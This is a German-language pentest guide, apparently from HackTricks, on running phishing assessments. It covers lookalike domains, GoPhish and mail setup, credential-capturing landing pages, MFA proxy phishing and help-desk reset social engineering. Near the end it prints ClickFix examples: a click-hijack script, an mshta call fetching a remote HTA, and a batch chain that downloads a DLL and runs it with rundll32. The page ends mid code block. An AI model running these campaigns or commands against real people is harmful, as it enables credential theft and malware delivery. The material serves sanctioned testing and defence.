# Phishing-Methodik

{{#include ../../banners/hacktricks-training.md}}

## Methodik

1. Opfer auskundschaften
1. Die **Opfer-Domain** auswählen.
2. Eine grundlegende Web-Aufklärung durchführen, **nach Login-Portalen suchen**, die vom Opfer verwendet werden, und **entscheiden**, welches davon du **imitieren** wirst.
3. **OSINT** verwenden, um **E-Mail-Adressen zu finden**.
2. Umgebung vorbereiten
1. **Die Domain kaufen**, die du für die Phishing-Bewertung verwenden wirst
2. Die zugehörigen Datensätze des **E-Mail-Dienstes konfigurieren** (SPF, DMARC, DKIM, rDNS)
3. Die VPS mit **gophish** konfigurieren
3. Kampagne vorbereiten
1. Die **E-Mail-Vorlage vorbereiten**
2. Die **Webseite vorbereiten**, um die Zugangsdaten zu stehlen
4. Kampagne starten!

## Ähnliche Domainnamen generieren oder eine vertrauenswürdige Domain kaufen

### Techniken zur Variation von Domainnamen

- **Keyword**: Der Domainname **enthält ein wichtiges **Keyword** der ursprünglichen Domain (z. B. zelster.com-management.com).<sup>[[1]](#references)</sup>
- **hypened subdomain**: Den **Punkt eines Subdomains durch einen Bindestrich ersetzen** (z. B. www-zelster.com).
- **New TLD**: Dieselbe Domain mit einer **neuen TLD** verwenden (z. B. zelster.org)
- **Homoglyph**: Einen Buchstaben im Domainnamen durch **ähnlich aussehende Buchstaben ersetzen** (z. B. zelfser.com).


{{#ref}}
homograph-attacks.md
{{#endref}}
- **Transposition:** Zwei Buchstaben **innerhalb des Domainnamens vertauschen** (z. B. zelsetr.com).
- **Singularization/Pluralization**: Am Ende des Domainnamens ein „s“ hinzufügen oder entfernen (z. B. zeltsers.com).
- **Omission**: Einen Buchstaben aus dem Domainnamen **entfernen** (z. B. zelser.com).
- **Repetition:** Einen Buchstaben im Domainnamen **wiederholen** (z. B. zeltsser.com).
- **Replacement**: Wie Homoglyph, aber weniger unauffällig. Einen Buchstaben im Domainnamen ersetzen, beispielsweise durch einen Buchstaben in der Nähe des ursprünglichen Buchstabens auf der Tastatur (z. B. zektser.com).
- **Subdomained**: Einen **Punkt** innerhalb des Domainnamens einfügen (z. B. ze.lster.com).
- **Insertion**: Einen Buchstaben in den Domainnamen **einfügen** (z. B. zerltser.com).
- **Missing dot**: Die TLD an den Domainnamen anhängen (z. B. zelstercom.com)

**Automatische Tools**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**Websites**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Bitflipping

Es besteht die **Möglichkeit, dass einige gespeicherte oder übertragene Bits automatisch umgekippt werden**, etwa durch verschiedene Faktoren wie Sonneneruptionen, kosmische Strahlung oder Hardwarefehler.

Wenn dieses Konzept auf **DNS-Anfragen angewendet wird**, ist es möglich, dass die **vom DNS-Server empfangene Domain** nicht mit der ursprünglich angeforderten Domain übereinstimmt.

Beispielsweise kann eine einzelne Bit-Änderung in der Domain „windows.com“ diese in „windnws.com“ ändern.

Angreifer könnten sich **dies zunutze machen, indem sie mehrere Bitflipping-Domains registrieren**, die der Domain des Opfers ähneln. Ihr Ziel besteht darin, legitime Benutzer auf ihre eigene Infrastruktur umzuleiten.

Weitere Informationen findest du unter [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)<sup>[[9]](#references)</sup>

### Eine vertrauenswürdige Domain kaufen

Du kannst unter [https://www.expireddomains.net/](https://www.expireddomains.net) nach einer abgelaufenen Domain suchen, die du verwenden könntest.\
Um sicherzustellen, dass die abgelaufene Domain, die du kaufen möchtest, **bereits eine gute SEO-Bewertung hat**, kannst du prüfen, wie sie in folgenden Diensten kategorisiert ist:

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## E-Mail-Adressen ermitteln

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) (100 % kostenlos)
- [https://phonebook.cz/](https://phonebook.cz) (100 % kostenlos)
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

Um **weitere** gültige E-Mail-Adressen zu **ermitteln** oder die bereits **ermittelten Adressen zu überprüfen**, kannst du prüfen, ob du sie per Brute-Force gegen die SMTP-Server des Opfers testen kannst. [Hier erfährst du, wie du E-Mail-Adressen überprüfen/ermitteln kannst](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration).\
Außerdem solltest du nicht vergessen: Wenn die Benutzer **ein Webportal für den Zugriff auf ihre E-Mails verwenden**, kannst du prüfen, ob es für **Username Brute Force** anfällig ist, und die Schwachstelle, sofern möglich, ausnutzen.

## GoPhish konfigurieren

### Installation

Du kannst es unter [https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0) herunterladen.

Lade es herunter, dekomprimiere es in `/opt/gophish` und führe `/opt/gophish/gophish` aus.\
In der Ausgabe wird dir ein Passwort für den Admin-Benutzer auf Port 3333 angezeigt. Greife daher auf diesen Port zu und verwende diese Zugangsdaten, um das Admin-Passwort zu ändern. Möglicherweise musst du diesen Port zu local tunneln:
```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```
### Konfiguration

**TLS-Zertifikatskonfiguration**

Vor diesem Schritt solltest du die **Domain**, die du verwenden wirst, **bereits gekauft** haben. Sie muss auf die **IP-Adresse des VPS** zeigen, auf dem du **gophish** konfigurierst.
```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```
**Mail-Konfiguration**

Beginne mit der Installation: `apt-get install postfix`

Füge anschließend die Domain zu den folgenden Dateien hinzu:

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

**Ändere außerdem die Werte der folgenden Variablen in /etc/postfix/main.cf**

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

Ändere abschließend die Dateien **`/etc/hostname`** und **`/etc/mailname`** auf deinen Domainnamen und **starte deinen VPS neu.**

Erstelle nun einen **DNS-A-Record** für `mail.<domain>`, der auf die **IP-Adresse** des VPS zeigt, sowie einen **DNS-MX-Record**, der auf `mail.<domain>` zeigt.

Testen wir nun das Senden einer E-Mail:
```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```
**Gophish-Konfiguration**

Beende die Ausführung von gophish und konfiguriere es.\
Ändere `/opt/gophish/config.json` wie folgt (beachte die Verwendung von https):
```bash
{
"admin_server": {
"listen_url": "127.0.0.1:3333",
"use_tls": true,
"cert_path": "gophish_admin.crt",
"key_path": "gophish_admin.key"
},
"phish_server": {
"listen_url": "0.0.0.0:443",
"use_tls": true,
"cert_path": "/opt/gophish/ssl_keys/key.crt",
"key_path": "/opt/gophish/ssl_keys/key.pem"
},
"db_name": "sqlite3",
"db_path": "gophish.db",
"migrations_prefix": "db/db_",
"contact_address": "",
"logging": {
"filename": "",
"level": ""
}
}
```
**gophish service konfigurieren**

Um den gophish service zu erstellen, damit er automatisch gestartet und als service verwaltet werden kann, kannst du die Datei `/etc/init.d/gophish` mit folgendem Inhalt erstellen:
```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
echo 'Starting '${processName}'...'
cd ${appDirectory}
nohup ./$process >>$logfile 2>>$errfile &
sleep 1
}

stop() {
echo 'Stopping '${processName}'...'
pid=$(/bin/pidof ${process})
kill ${pid}
sleep 1
}

status() {
pid=$(/bin/pidof ${process})
if [["$pid" != ""| "$pid" != "" ]]; then
echo ${processName}' is running...'
else
echo ${processName}' is not running...'
fi
}

case $1 in
start|stop|status) "$1" ;;
esac
```
Konfigurieren Sie den Dienst vollständig und überprüfen Sie ihn mit:
```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```
## Mailserver und Domain konfigurieren

### Warten und seriös wirken

Je älter eine Domain ist, desto geringer ist die Wahrscheinlichkeit, dass sie als Spam erkannt wird. Daher solltest du vor dem Phishing-Assessment so lange wie möglich warten (mindestens 1 Woche). Wenn du außerdem eine Seite über einen seriösen Bereich einrichtest, wird die Reputation besser sein.

Beachte, dass du auch dann, wenn du eine Woche warten musst, jetzt bereits alles konfigurieren kannst.

### Reverse-DNS-(rDNS-)Record konfigurieren

Lege einen rDNS-(PTR-)Record an, der die IP-Adresse des VPS in den Domainnamen auflöst.

### Sender Policy Framework (SPF)-Record

Du musst **einen SPF-Record für die neue Domain konfigurieren**. Wenn du nicht weißt, was ein SPF-Record ist, [**lies diese Seite**](../../network-services-pentesting/pentesting-smtp/index.html#spf).

Du kannst [https://www.spfwizard.net/](https://www.spfwizard.net) verwenden, um deine SPF-Richtlinie zu generieren (verwende die IP-Adresse des VPS).

![SPF Wizard-Formular zum Generieren eines SPF-Records für eine Phishing-Domain](<../../images/image (1037).png>)

Dies ist der Inhalt, der innerhalb eines TXT-Records in der Domain festgelegt werden muss:
```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```
### Domain-basierter Message Authentication, Reporting & Conformance (DMARC)-Eintrag

Du musst **einen DMARC-Eintrag für die neue Domäne konfigurieren**. Falls du nicht weißt, was ein DMARC-Eintrag ist, [**lies diese Seite**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc).

Du musst einen neuen DNS-TXT-Eintrag erstellen, der auf den Hostnamen `_dmarc.<domain>` mit folgendem Inhalt zeigt:
```bash
v=DMARC1; p=none
```
### DomainKeys Identified Mail (DKIM)

Du musst **einen DKIM für die neue Domain konfigurieren**. Wenn du nicht weißt, was ein DMARC record ist, [**lies diese Seite**](../../network-services-pentesting/pentesting-smtp/index.html#dkim).

Dieses Tutorial basiert auf: [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)<sup>[[4]](#references)</sup>

> [!TIP]
> Du musst beide B64-Werte, die der DKIM-Schlüssel erzeugt, zusammenfügen:
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### Teste den Score deiner E-Mail-Konfiguration

Das kannst du mit [https://www.mail-tester.com/](https://www.mail-tester.com) tun\
Öffne einfach die Seite und sende eine E-Mail an die Adresse, die dir angezeigt wird:
```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```
Sie können auch **Ihre E-Mail-Konfiguration überprüfen**, indem Sie eine E-Mail an `check-auth@verifier.port25.com` senden und **die Antwort lesen** (dafür müssen Sie **Port** **25** öffnen und die Antwort in der Datei _/var/mail/root_ sehen, wenn Sie die E-Mail als root senden).\
Überprüfen Sie, dass Sie alle Tests bestehen:
```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```
Du könntest auch eine **Nachricht an ein Gmail-Konto unter deiner Kontrolle senden** und die **Header der E-Mail** in deinem Gmail-Posteingang überprüfen. `dkim=pass` sollte im Header-Feld `Authentication-Results` vorhanden sein.
```
Authentication-Results: mx.google.com;
spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
dkim=pass header.i=@example.com;
```
### ​Entfernen von der Spamhaus-Blacklist

Die Seite [www.mail-tester.com](https://www.mail-tester.com) kann dir anzeigen, ob deine Domain von Spamhaus blockiert wird. Du kannst die Entfernung deiner Domain/IP unter [https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/) anfordern.

### Entfernen von der Microsoft-Blacklist

​​Du kannst die Entfernung deiner Domain/IP unter [https://sender.office.com/](https://sender.office.com) anfordern.

## GoPhish Campaign erstellen und starten

### Sending Profile

- Lege einen **Namen zur Identifizierung** des Senderprofils fest
- Entscheide, von welchem Konto aus du die Phishing-E-Mails senden möchtest. Vorschläge: _noreply, support, servicedesk, salesforce..._
- Du kannst Benutzername und Passwort leer lassen, musst aber sicherstellen, dass **Ignore Certificate Errors** aktiviert ist

![GoPhish Campaign erstellen und starten - Sending Profile: Du kannst Benutzername und Passwort leer lassen, musst aber sicherstellen, dass Ignore Certificate Errors aktiviert ist](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> Es wird empfohlen, die Funktion "**Send Test Email**" zu verwenden, um zu testen, ob alles funktioniert.\
> Ich würde empfehlen, die Test-E-Mails an **10min-Mail-Adressen** zu senden, um zu vermeiden, dass du durch die Tests auf eine Blacklist gelangst.

### E-Mail-Vorlage

- Lege einen **Namen zur Identifizierung** der Vorlage fest
- Schreibe anschließend einen **Betreff** (nichts Ungewöhnliches, sondern einfach etwas, das du in einer regulären E-Mail erwarten würdest)
- Stelle sicher, dass du "**Add Tracking Image**" aktiviert hast
- Schreibe die **E-Mail-Vorlage** (du kannst Variablen wie im folgenden Beispiel verwenden):
```html
<html>
<head>
<title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```
Beachte, dass **zur Erhöhung der Glaubwürdigkeit der E-Mail** empfohlen wird, eine Signatur aus einer E-Mail des Kunden zu verwenden. Vorschläge:

- Sende eine E-Mail an eine **nicht existente Adresse** und prüfe, ob die Antwort eine Signatur enthält.
- Suche nach **öffentlichen E-Mail-Adressen** wie info@ex.com, press@ex.com oder public@ex.com, sende ihnen eine E-Mail und warte auf die Antwort.
- Versuche, eine **entdeckte gültige** E-Mail-Adresse zu kontaktieren, und warte auf die Antwort.

![Sending Profile - Email Template: Versuche, eine entdeckte gültige E-Mail-Adresse zu kontaktieren, und warte auf die Antwort](<../../images/image (80).png>)

> [!TIP]
> Das Email Template ermöglicht auch das **Anhängen von Dateien**. Wenn du außerdem NTLM challenges mithilfe speziell erstellter Dateien/Dokumente stehlen möchtest, [lies diese Seite](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md).

### Landing Page

- Gib einen **Namen** ein.
- **Schreibe den HTML-Code** der Webseite. Beachte, dass du Webseiten **importieren** kannst.
- Aktiviere **Capture Submitted Data** und **Capture Passwords**.
- Lege eine **redirection** fest.

![Email Template - Landing Page: Capture Submitted Data und Capture Passwords aktivieren](<../../images/image (826).png>)

> [!TIP]
> Normalerweise musst du den HTML-Code der Seite ändern und lokal einige Tests durchführen (möglicherweise mit einem Apache-Server), **bis dir das Ergebnis gefällt.** Schreibe diesen HTML-Code anschließend in das Feld.\
> Wenn du **statische Ressourcen** für das HTML benötigst (beispielsweise einige CSS- und JS-Seiten), kannst du sie unter _**/opt/gophish/static/endpoint**_ speichern und anschließend über _**/static/\<filename>**_ darauf zugreifen.

> [!TIP]
> Für die redirection kannst du die **Benutzer zur legitimen Hauptwebseite** des Opfers weiterleiten oder sie beispielsweise zu _/static/migration.html_ weiterleiten, dort für 5 Sekunden ein **Lade-Symbol (**[**https://loading.io/**](https://loading.io)**) anzeigen und anschließend angeben, dass der Vorgang erfolgreich war**.

### Users & Groups

- Lege einen Namen fest.
- **Importiere die Daten** (beachte, dass du für die Verwendung des Templates in diesem Beispiel den Vornamen, Nachnamen und die E-Mail-Adresse jedes Benutzers benötigst).

![Landing Page - Users & Groups: Importiere die Daten (beachte, dass du für die Verwendung des Templates in diesem Beispiel den Vornamen, Nachnamen und die E-Mail-Adresse jedes Benutzers benötigst)](<../../images/image (163).png>)

### Campaign

Erstelle abschließend eine campaign, indem du einen Namen, das email template, die landing page, die URL, das sending profile und die Gruppe auswählst. Beachte, dass die URL der an die Opfer gesendete Link ist.

Beachte, dass das **Sending Profile den Versand einer Test-E-Mail ermöglicht, um zu sehen, wie die fertige phishing email aussieht**:

![Users & Groups - Campaign: Beachte, dass das Sending Profile den Versand einer Test-E-Mail ermöglicht, um zu sehen, wie die fertige phishing email aussieht](<../../images/image (192).png>)

> [!TIP]
> Ich würde empfehlen, die **Test-E-Mails an 10min-Mail-Adressen zu senden**, um zu vermeiden, dass deine Adresse durch die Tests auf eine blacklist gesetzt wird.

Sobald alles bereit ist, starte einfach die campaign!

## Website Cloning

Wenn du die Website aus irgendeinem Grund klonen möchtest, sieh dir die folgende Seite an:


{{#ref}}
clone-a-website.md
{{#endref}}

## Backdoored Documents & Files

Bei einigen phishing assessments (hauptsächlich für Red Teams) möchtest du außerdem **Dateien versenden, die eine Art backdoor enthalten** (möglicherweise ein C2 oder einfach etwas, das eine authentication auslöst).\
Auf der folgenden Seite findest du einige Beispiele:


{{#ref}}
phishing-documents.md
{{#endref}}

## Phishing MFA

### Via Proxy MitM

Der vorherige Angriff ist ziemlich clever, da du eine echte Website fälschst und die vom Benutzer eingegebenen Informationen sammelst. Wenn der Benutzer jedoch nicht das korrekte Passwort eingegeben hat oder die von dir gefälschte Anwendung mit 2FA konfiguriert ist, **reichen diese Informationen nicht aus, um den getäuschten Benutzer zu imitieren**.

Hier sind Tools wie [**evilginx2**](https://github.com/kgretzky/evilginx2)**,** [**CredSniper**](https://github.com/ustayready/CredSniper) und [**muraena**](https://github.com/muraenateam/muraena) nützlich. Dieses Tool ermöglicht dir die Durchführung eines MitM-ähnlichen Angriffs. Grundsätzlich funktionieren die Angriffe folgendermaßen:

1. Du **imitierst das Login-Formular** der echten Webseite.
2. Der Benutzer **sendet** seine **Credentials** an deine gefälschte Seite, und das Tool sendet diese an die echte Webseite weiter, **wobei geprüft wird, ob die Credentials funktionieren**.
3. Wenn das Konto mit **2FA** konfiguriert ist, fragt die MitM-Seite danach. Sobald der **Benutzer den Code eingibt**, sendet das Tool ihn an die echte Webseite weiter.
4. Sobald der Benutzer authentifiziert ist, hast du (als Angreifer) **die Credentials, 2FA, den Cookie und sämtliche Informationen** aus jeder Interaktion erfasst, während das Tool einen MitM durchführt.

### Via VNC

Was wäre, wenn du das Opfer nicht zu einer **bösartigen Seite mit demselben Aussehen wie das Original** schickst, sondern zu einer **VNC-Sitzung mit einem Browser, der mit der echten Webseite verbunden ist**? Du könntest sehen, was es tut, das Passwort, die verwendete MFA, die Cookies usw. stehlen.\
Dies ist mit [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC)<sup>[[3]](#references)</sup> möglich.

## Detecting the detection

Eine der besten Möglichkeiten herauszufinden, ob du entdeckt wurdest, besteht offensichtlich darin, **deine Domain in blacklists zu suchen**. Wenn sie dort aufgeführt ist, wurde deine Domain auf irgendeine Weise als verdächtig erkannt.\
Eine einfache Möglichkeit zu prüfen, ob deine Domain in einer blacklist auftaucht, ist die Verwendung von [https://malwareworld.com/](https://malwareworld.com).

Es gibt jedoch weitere Möglichkeiten herauszufinden, ob das Opfer **aktiv nach verdächtigen phishing-Aktivitäten im Internet sucht**, wie in:


{{#ref}}
detecting-phising.md
{{#endref}}

Du kannst eine **Domain mit einem sehr ähnlichen Namen** wie die Domain des Opfers **kaufen und/oder ein Zertifikat** für eine von dir kontrollierte **subdomain** erstellen, die das **keyword** der Domain des Opfers **enthält**. Wenn das **Opfer** irgendeine Art von **DNS- oder HTTP-Interaktion** damit durchführt, weißt du, dass es **aktiv nach verdächtigen Domains sucht**, und du musst sehr unauffällig vorgehen.<sup>[[2]](#references)</sup>

### Evaluate the phishing

Verwende [**Phishious** ](https://github.com/Rices/Phishious), um zu prüfen, ob deine E-Mail im Spam-Ordner landet oder blockiert wird beziehungsweise erfolgreich zugestellt wird.

## High-Touch Identity Compromise (Help-Desk MFA Reset)

Moderne intrusion sets überspringen E-Mail-lures zunehmend vollständig und **zielen direkt auf den Service-Desk- beziehungsweise Identity-Recovery-Workflow**, um MFA zu umgehen. Der Angriff erfolgt vollständig nach dem Prinzip "living-off-the-land": Sobald der Operator über gültige Credentials verfügt, bewegt er sich mithilfe integrierter Admin-Tools weiter – Malware ist nicht erforderlich.<sup>[[5]](#references)</sup>

### Attack flow
1. Führe Reconnaissance des Opfers durch.
* Sammle persönliche und unternehmensbezogene Informationen aus LinkedIn, data breaches, öffentlichem GitHub usw.
* Identifiziere besonders wertvolle Identitäten (Führungskräfte, IT, Finanzen) und ermittle den **genauen Help-Desk-Prozess** für das Zurücksetzen von Passwort/MFA.
2. Social Engineering in Echtzeit.
* Kontaktiere den Help-Desk per Telefon, Teams oder Chat und gib dich als Zielperson aus (oft mit **gefälschter Caller-ID** oder **geklonter Stimme**).
* Liefere die zuvor gesammelten PII, um die wissensbasierte Verifizierung zu bestehen.
* Überzeuge den Mitarbeiter, das **MFA secret zurückzusetzen** oder einen **SIM-swap** für eine registrierte Mobilfunknummer durchzuführen.
3. Unmittelbare Aktionen nach dem Zugriff (in realen Fällen ≤60 Minuten).
* Errichte einen foothold über ein beliebiges Web-SSO-Portal.
* Ermittle AD/AzureAD mit integrierten Tools (keine Binaries werden abgelegt):
```powershell
# list directory groups & privileged roles
Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

# AzureAD / Graph – list directory roles
Get-MgDirectoryRole | ft DisplayName,Id

# Enumerate devices the account can login to
Get-MgUserRegisteredDevice -UserId <user@corp.local>
```
* Führe laterale Bewegungen mit **WMI**, **PsExec** oder legitimen **RMM**-Agents durch, die in der Umgebung bereits auf der Whitelist stehen.

### Detection & Mitigation
* Behandle die Identitätswiederherstellung über den Help-Desk als **privilegierten Vorgang** – verlange step-up authentication und die Genehmigung eines Managers.
* Führe Regeln für **Identity Threat Detection & Response (ITDR)** / **UEBA** ein, die Folgendes melden:
* MFA-Methode geändert + authentication von einem neuen Gerät/aus einer neuen Region.
* Unmittelbare Rechteausweitung desselben Principals (user-→-admin).
* Zeichne Help-Desk-Anrufe auf und erzwinge vor jedem Reset einen **Rückruf an eine bereits registrierte Nummer**.
* Implementiere **Just-In-Time (JIT) / Privileged Access**, damit neu zurückgesetzte Konten nicht automatisch hochprivilegierte Tokens erben.

---

## At-Scale Deception – SEO Poisoning & “ClickFix” Campaigns
Commodity crews gleichen die Kosten von High-Touch-Operationen durch Massenangriffe aus, die **Suchmaschinen und Werbenetzwerke zum Delivery Channel machen**.<sup>[[5]](#references)</sup>

1. **SEO poisoning / malvertising** platziert ein gefälschtes Ergebnis wie `chromium-update[.]site` an der Spitze der Suchanzeigen.
2. Das Opfer lädt einen kleinen **first-stage loader** herunter (häufig JS/HTA/ISO). Von Unit 42 beobachtete Beispiele:
* `RedLine stealer`
* `Lumma stealer`
* `Lampion Trojan`
3. Der Loader exfiltriert Browser-Cookies und Credential-Datenbanken und lädt anschließend einen **silent loader** herunter, der *in realtime* entscheidet, ob Folgendes eingesetzt wird:
* RAT (z. B. AsyncRAT, RustDesk)
* ransomware / wiper
* persistence component (registry Run key + scheduled task)

### Hardening tips
* Blockiere neu registrierte Domains und erzwinge **Advanced DNS / URL Filtering** sowohl für *search-ads* als auch für E-Mail.
* Beschränke die Softwareinstallation auf signierte MSI-/Store-Pakete und untersage die Ausführung von `HTA`, `ISO` und `VBS` per Richtlinie.
* Überwache untergeordnete Prozesse von Browsern, die Installer öffnen:
```yaml
- parent_image: /Program Files/Google/Chrome/*
and child_image: *\\*.exe
```
* Suche nach LOLBins, die häufig von first-stage loadern missbraucht werden (z. B. `regsvr32`, `curl`, `mshta`).

### Download-button click hijacking with TDS handoff
Einige gefälschte Softwareportale lassen das sichtbare Download-`href` auf die **echte GitHub-/Release-URL** zeigen, hijacken jedoch die **erste** Benutzerinteraktion mit JavaScript und leiten das Opfer stattdessen in eine **Traffic Distribution System (TDS)**-Kette weiter.<sup>[[8]](#references)</sup>
```javascript
const cachedOpen = window.open;
document.addEventListener(isChromeDesktop() ? "mousedown" : "click", (e) => {
if (!isEligibleClick(e.target)) return;
cachedOpen(generateRuntimeURL({referrer: location.href, userDestination: extractClickedLink(e.target)}));
e.stopImmediatePropagation();
e.preventDefault();
}, true);
```
Wesentliche Merkmale:
- Der Hook läuft normalerweise in der **capture phase** (`true`) auf `document`, sodass er vor den Handlern der Website ausgelöst wird.
- Chrome verwendet häufig `mousedown` statt `click`, um die Weiterleitung an eine gültige **user gesture** zu binden und die Umgehung von Popup-Blockern zu verbessern.
- Einige Varianten öffnen zunächst `about:blank` oder simulieren Klicks auf `<a target="_blank">` und weisen die TDS-URL erst später zu.
- Browserseitige Begrenzungen werden häufig in `localStorage` gespeichert. Daher kann der **erste Klick** Malware erreichen, während Aktualisierungen und Wiederholungsversuche auf den harmlos wirkenden sichtbaren Link zurückfallen.
- Die TDS kann nach Referrer, Einstiegsdomain, GEO, Browser-/Geräte-Fingerprint, VPN-/Rechenzentrumsprüfungen, Klickkontext und sitzungsbezogenen Zählern filtern, wodurch Wiederholungen durch Analysten nicht deterministisch sind.

Ideen für Verteidiger:
- Vergleiche den **angezeigten** `href` mit dem **tatsächlichen** Navigationsziel, das zum Zeitpunkt des Klicks erzeugt wird.
- Suche nach `document.addEventListener(..., true)`-Handlern, die im Zusammenhang mit `window.open`, `about:blank` oder simulierten Anchor-Klicks sowohl `preventDefault()` als auch `stopImmediatePropagation()` aufrufen.
- Behandle Gruppen neu registrierter Software-Download-Domains, die alle dieselbe CloudFront-/JS-Stage laden, als starkes Indiz für ein SEO-Poisoning-/TDS-Muster.

### ClickFix von gefälschten Verifizierungsseiten + LOLBAS-Abrufe im Archiv-Look
Einige TDS-Zweige enden auf einer gefälschten Verifizierungsseite (im Cloudflare-/IUAM-Stil), die das Opfer auffordert, eine vertrauenswürdige Windows-Binärdatei auszuführen, beispielsweise:<sup>[[8]](#references)</sup>
```cmd
C:\Windows\SysWOW64\mshta.exe https://example[.]com/navy.7z
```
Hinweise:
- `mshta.exe` führt das **HTA/VBScript am Anfang der Antwort** aus, selbst wenn die URL vorgibt, ein `.7z`-Archiv zu sein; angehängte Archivdaten können reine Ablenkung sein.
- Nachfolgende Stufen täuschen häufig weiterhin über den Dateityp hinweg (`.rtf` für PowerShell, `.asar` für Python, ZIPs mit aufgefüllten Binaries) und wechseln anschließend zu **manuellem PE-Mapping / In-Memory-Ausführung**.
- Wenn Sie auf eine dieser Ketten reagieren, bewahren Sie **Netzwerk- + Speicherartefakte ab dem ersten erfolgreichen Lauf** auf: Spätere Wiederholungen zeigen möglicherweise nur einen harmlosen Installer/SFX-Pfad oder schlagen fehl, weil die Payload-/Schlüssel-Freigabe an die ursprüngliche TDS-Sitzung gebunden war.

### ClickFix-DLL-Bereitstellungstechniken (gefälschtes CERT-Update)
* Köder: geklonte nationale CERT-Warnung mit einer **Update**-Schaltfläche, die schrittweise Anweisungen zur „Behebung“ anzeigt. Die Opfer werden aufgefordert, eine Batch-Datei auszuführen, die eine DLL herunterlädt und sie über `rundll32` ausführt.<sup>[[8]](#references)</sup>
* Typische beobachtete Batch-Kette:
```cmd
echo powershell -Command "Invoke-WebRequest -Uri 'https://example[.]org/notepad2.dll' -OutFile '%TEMP%\notepad2.dll'"
echo timeout /t 10
echo rundll32.exe "%TEMP%\notepad2.dll",notepad
```
* `Invoke-WebRequest` legt die Payload in `%TEMP%` ab, eine kurze Wartezeit verbirgt Netzwerklatenz, anschließend ruft `rundll32` den exportierten Einstiegspunkt (`notepad`) auf.
* Die DLL sendet die Host-Identität an das C2 und fragt alle paar Minuten das C2 ab. Remote-Aufgaben werden als **Base64-codiertes PowerShell** übertragen und versteckt sowie mit Policy-Bypass ausgeführt:
```powershell
